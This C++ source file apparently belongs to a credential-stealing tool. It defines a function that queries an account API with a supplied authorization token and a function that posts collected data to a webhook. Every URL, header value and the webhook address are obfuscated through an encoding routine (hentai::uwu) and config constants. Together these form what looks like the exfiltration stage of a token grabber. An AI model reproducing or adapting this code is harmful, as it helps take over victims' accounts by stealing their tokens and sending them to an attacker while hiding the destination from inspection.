#include "Web.h"
#include "Path.h"
#include "Config.h"
#include <iostream>
json web::get_data_from_token(std::string token)
{
	json data = web::do_get_request_return_json(hentai ::uwu(woow ::url), {{hentai::uwu(woow ::authorization), token},
																		   {hentai::uwu(woow ::user_agent), hentai::uwu(woow ::agent_value)}});
	return data;
}

json web::do_get_request_return_json(std::string url, std ::map<std ::string, std::string> headers, int valid_code)
{
	cpr::Header request_headers;
	for (auto &h : headers)
	{
		request_headers[h.first] = h.second;
	}

	cpr::Response r = cpr::Get(cpr::Url{url}, request_headers);

	if (r.status_code != valid_code)
		return {};

	return json::parse(r.text);
}

void web::send_to_webhook(std::string data)
{

	std::cout << data << "\n";
	cpr::Post(cpr::Url{hentai::uwu(config::encoded_webhook)}, cpr::Header{{hentai::uwu(woow ::content_type), hentai::uwu(woow ::type_value)}}, cpr::Body{data});
}
